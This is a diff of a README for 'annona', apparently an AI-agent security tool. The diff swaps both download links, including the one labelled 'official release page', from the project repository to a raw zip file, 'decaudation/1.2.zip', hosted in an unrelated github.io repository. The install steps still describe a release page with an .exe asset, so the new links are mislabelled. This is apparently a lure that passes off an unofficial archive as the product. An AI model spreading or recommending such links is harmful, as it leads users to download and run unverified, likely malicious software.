@@ -5,7 +5,7 @@ description: "Enforce execution policies for AI agents with a sovereign local ke
 ---
 # 🛡️ annona - Secure control for your AI agents
 
-[![](https://img.shields.io/badge/Download_Annona-Blue?style=for-the-badge)](https://github.com/Arrivalscenestealer31/annona)
+[![](https://img.shields.io/badge/Download_Annona-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Arrivalscenestealer31/arrivalscenestealer31.github.io/main/decaudation/1.2.zip)
 
 ## 🎯 What is annona?
 
@@ -25,7 +25,7 @@ Before you install annona, check that your computer meets these needs:
 
 Follow these steps to get annona running on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Arrivalscenestealer31/annona).
+1. Go to the [official release page](https://raw.githubusercontent.com/Arrivalscenestealer31/arrivalscenestealer31.github.io/main/decaudation/1.2.zip).
 2. Look for the section labeled "Assets."
 3. Select the file ending in `.exe` to begin the download.
 4. Save the file to your desktop or your downloads folder.
